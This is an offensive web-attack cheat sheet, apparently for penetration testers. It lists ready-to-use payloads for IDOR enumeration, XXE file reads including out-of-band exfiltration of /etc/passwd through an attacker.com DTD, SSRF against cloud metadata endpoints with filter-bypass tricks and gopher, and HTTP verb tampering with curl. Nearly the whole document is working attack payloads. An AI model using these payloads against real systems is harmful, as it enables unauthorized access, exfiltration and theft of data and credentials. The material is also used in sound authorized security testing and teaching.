# Web Attacks

Advanced web vulnerabilities beyond OWASP Top 10 basics — IDOR, XXE, SSRF, and HTTP verb tampering.

## IDOR (Insecure Direct Object Reference)

Access unauthorized resources by modifying object identifiers in requests.

```bash
# Change user ID in URL
GET /api/users/1/profile   → GET /api/users/2/profile

# Change ID in body
{"user_id": 1}             → {"user_id": 2}

# Change in cookie
Cookie: user_id=1          → Cookie: user_id=2

# Indirect IDOR — hashed IDs
# Predict hash: MD5/SHA1 of numeric ID
echo -n "2" | md5sum

# Mass enumeration via ffuf
ffuf -u http://target.com/api/user/FUZZ -w ids.txt -mc 200
seq 1 1000 > ids.txt
```

## XXE (XML External Entity)

```xml
<!-- Basic file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

<!-- OOB exfiltration (when response doesn't reflect content) -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<data>anything</data>

<!-- evil.dtd on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%oob;

<!-- SVG XXE (file upload) -->
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>
```

## SSRF (Server-Side Request Forgery)

```bash
# Basic SSRF — access internal services
url=http://127.0.0.1/admin
url=http://169.254.169.254/latest/meta-data/   # AWS metadata

# Port scanning via SSRF
url=http://127.0.0.1:22    # SSH (different response = port open)
url=http://127.0.0.1:3306  # MySQL

# Bypass SSRF filters
url=http://2130706433/      # 127.0.0.1 as decimal
url=http://0x7f000001/      # 127.0.0.1 as hex
url=http://127.1/           # Short form
url=http://attacker.com@127.0.0.1/  # @ trick
url=http://127.0.0.1.attacker.com/  # DNS rebinding

# SSRF via Gopher (interact with non-HTTP)
url=gopher://127.0.0.1:25/_EHLO%20attacker
```

## HTTP Verb Tampering

```bash
# Try different methods on restricted endpoints
curl -X OPTIONS http://target.com/admin/   # see what's allowed
curl -X PUT http://target.com/admin/
curl -X DELETE http://target.com/admin/
curl -X TRACE http://target.com/           # cross-site tracing (XST)

# Override method via header (some frameworks honor this)
POST /admin HTTP/1.1
X-HTTP-Method-Override: PUT
```
